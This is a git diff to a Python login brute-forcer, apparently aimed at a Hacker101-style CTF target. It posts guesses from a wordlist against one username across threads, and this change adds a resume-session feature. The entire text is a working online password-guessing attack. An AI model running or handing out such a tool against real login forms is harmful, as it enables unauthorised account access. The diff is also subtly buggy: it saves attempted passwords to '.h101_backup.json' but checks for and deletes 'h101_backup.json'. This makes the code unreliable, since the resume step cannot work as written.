@@ -1,14 +1,17 @@
 #!/usr/bin/env python3
 # h101_login.py
-
+import json
+import os
 import pathlib
-import subprocess
 import sys
+import time
 from concurrent.futures import ThreadPoolExecutor, Future
 from queue import Queue
 
 import click
 import requests
+from rich.console import Console
+from rich.prompt import Prompt
 
 
 class H101Login:
@@ -18,6 +21,8 @@ class H101Login:
 
     def __init__(self, url: str, username: str, wordlist_file: pathlib.Path, max_threads: int, valid_string: str,
                  invalid_string: str) -> None:
+        self.c = Console()
+        self.p = Prompt()
         self.url: str = url
         self.username = username
         self.wordlist_file: pathlib.Path = wordlist_file
@@ -29,11 +34,16 @@ class H101Login:
         self.word_queue = Queue()
         self.found_passwd = []
         self.futures = Queue()
+        self.serialized_list = []
+
+    def backup_queue(self, word):
+        self.serialized_list.append(word)
 
     def _loop_words(self, seq_number, word):
         word = word.strip()
         if word != "":
             data = {"username": self.username, "password": word}
+            self.backup_queue(data["password"])
             response = self.send_request(data)
             self.check_response(seq_number, word, response)
 
@@ -50,7 +60,8 @@ class H101Login:
             seq_number = 1
             try:
                 while not self.word_queue.empty():
-                    future = executor.submit(self._loop_words, seq_number, self.word_queue.get())
+                    word = self.word_queue.get()
+                    future = executor.submit(self._loop_words, seq_number, word)
                     self.futures.put(future)
                     seq_number += 1
             except KeyboardInterrupt:
@@ -73,14 +84,28 @@ class H101Login:
             else:
                 print(f"\r[*] Attempted requests: {seq_number}. Current password: {word}", end=" " * 10)
                 sys.stdout.flush()
-            # time.sleep(0.2)
+                time.sleep(0.1)
         except KeyboardInterrupt:
             self.close()
 
-    def start_words_loop(self):
+    def start_words_loop(self, resume=False):
         print("[+] Reading wordlist...")
         with open(self.wordlist_file, "r") as wl:
-            self.loop_words(wl.readlines())
+            wordlist = [word.strip() for word in wl.readlines()]
+        self.c.print(f"Wordlist length: {len(wordlist)}")
+        if resume:
+            resume_confirm = self.p.ask("Want to resume previous session?", choices=["y", "n"], show_choices=True,
+                                default="y")
+            if resume_confirm == "y":
+                with open("h101_backup.json", "r") as bck_file:
+                    backup_wordlist = json.load(bck_file)
+                    wordlist = [word for word in wordlist if word not in backup_wordlist]
+                    self.c.print(f"Total passwords for attack: {len(wordlist)}. Already attempted: {len(backup_wordlist)}")
+            else:
+                self.c.print(f"Total passwords for attack: {len(wordlist)}")
+        elif not resume:
+            self.c.print(f"Total passwords for attack: {len(wordlist)}")
+        self.loop_words(wordlist)
 
     def close(self):
         with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
@@ -90,16 +115,22 @@ class H101Login:
                     if not future.cancelled():
                         future.cancel()
             executor.shutdown(wait=True)
+        with open(".h101_backup.json", "w") as bkp_file:
+            json.dump(self.serialized_list, bkp_file)
         sys.exit("[-] Detected KeyboardInterrupt. Quitting...")
 
     def run(self):
         try:
-            self.start_words_loop()
+            if os.path.exists("h101_backup.json"):
+                self.start_words_loop(resume=True)
+            else:
+                self.start_words_loop()
+            try:
+                os.remove("h101_backup.json")
+            except FileNotFoundError:
+                pass
         except KeyboardInterrupt:
             self.close()
-        finally:
-            # Print the ANSI escape code to show the cursor again
-            print("\033[?25h")
 
 
 @click.command(
